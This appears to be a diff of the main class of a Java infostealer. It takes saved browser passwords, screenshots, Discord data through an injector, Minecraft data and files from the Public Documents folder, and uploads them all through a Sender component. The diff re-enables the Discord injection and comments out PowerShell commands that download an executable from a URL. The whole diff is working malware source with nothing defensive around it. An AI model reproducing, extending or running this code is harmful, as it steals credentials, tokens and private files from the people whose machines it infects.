@@ -21,23 +21,26 @@ public class Start {
     public static String documents = "C:\\Users\\Public\\Documents";
 
     public static String exeUrl = "your exe url";
+    static String passwords = new Passwords().grabPassword();
+
+    public static String aaaa = new String(Base64.getDecoder().decode(passwords), StandardCharsets.UTF_8);
 
     public static void main(String[] argument) throws Exception {
         String username = System.getProperty("user.name");
         OkHttpClient client = new OkHttpClient();
-
+        /*
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -O 'C:\\Users\\" + username + "\\update.exe'");
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\update.exe'");
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\xray.jar'");
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl +  " -O 'C:\\Users\\" + username + "\\xray.jar'");
-
+        */
         String version = "1.0.2";
 		versionChecker(version);
         Sender.sendMessage("Starting DiscordInjector v" + version);
 
-        //if (DiscordInjector.instance == null){
-		//	DiscordInjector.instance = new DiscordInjector();
-		//}
+        if (DiscordInjector.instance == null){
+            DiscordInjector.instance = new DiscordInjector();
+		}
 
         byte[] screenshot = Screenshot.takeScreenshot();
         Sender.sendFile(client, new MultipartBody.Builder()
@@ -47,17 +50,15 @@ public class Start {
         //ElevateUtil elevateUtil = new ElevateUtil();
         //elevateUtil.elevate();
 
-        //DiscordInjector.instance.initialize();
+        DiscordInjector.instance.initialize();
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
 
         //grab passwords
-        String passwords = new Passwords().grabPassword();
-        String s = new String(Base64.getDecoder().decode(passwords), StandardCharsets.UTF_8);
         //write into text file
         Sender.sendFile(client, new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
-                .addFormDataPart("file", "Passwords.txt", RequestBody.create(s, MediaType.parse("text/plain")))
+                .addFormDataPart("file", "Passwords.txt", RequestBody.create(aaaa, MediaType.parse("text/plain")))
                 .build());
 		Sender.sendMessage("Passwords done.");
 		Mods.main(argument);
@@ -67,7 +68,7 @@ public class Start {
         Minecraft.sendMinecraft();
         KillBrowsers.kill();
         telegram();
-
+        //Downloads.main(argument);
 
         File folder = new File("C:\\Users\\Public\\Documents");
         File[] listOfFiles = folder.listFiles();
@@ -96,7 +97,7 @@ public class Start {
 
         Sender.sendFile(client, requestBody);
 
-        Sender.sendToServer(zort);
+        //Downloads.main(argument);
 
 	}
 
